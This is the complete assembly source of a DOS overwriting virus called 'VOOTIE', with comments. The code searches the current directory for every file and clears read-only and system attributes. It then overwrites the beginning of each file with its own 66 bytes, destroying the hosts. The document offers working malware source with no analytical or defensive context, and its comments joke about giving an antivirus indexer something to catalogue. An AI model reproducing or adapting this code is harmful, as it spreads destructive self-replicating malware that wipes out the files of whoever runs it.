   ; VOOTIE virus



   CODE    SEGMENT
       ASSUME  CS:CODE, DS:CODE, ES:CODE, SS:NOTHING

       org     0100h

   Vootie: mov     dx,offset file_argument ;load search mask, *.*, for any files
       push    bp                      ;
       mov     ah,4Eh                  ;find first host file, any file

   refind: int     21h                     ;keep cycling through directory

       jb      exit                    ;no more files, exit
       mov     ah,2Fh                  ;set DTA
       int     21h
       mov     si,bx
       mov     ax,4301h                ;clear file attributes so
       xor     cx,cx                   ;virus can roll over read-only
                       ;and system files
       lea     dx,[si+1Eh]
       int     21h
       mov     ax,3D02h                ;open host file, read/write
       int     21h
       xchg    ax,bx                   ;put handle in ax
       mov     ah,40h                  ;write to file function
       mov     cx,0042h                ;66 bytes to write in cx
       mov     dx,0100h                ;write from start of Vootie
       int     21h
       mov     ah,3Eh                  ;close infected file
       int     21h
       mov     ah,4Fh                  ;find next file in directory
       jmp     Short refind            ;cycle to "refind"
   ;---------------------------------------
   exit:   pop     bp
       mov     ax,4C00h                ;terminate program
       int     21h                     ;exit to DOS

   ;---------------------------------------
   ;DATA

   file_argument        db      "*.*"
   my_name              dw      5600h      ;virus name =
                db      99h        ;"VOOTIE" in
                db      93h        ;weird ASCII
                dw      8BC2h      ;so VSUM indexer will
                db      90h        ;have something to include
                       ;in database before lunch
   CODE    ENDS
       END     VOOTIE
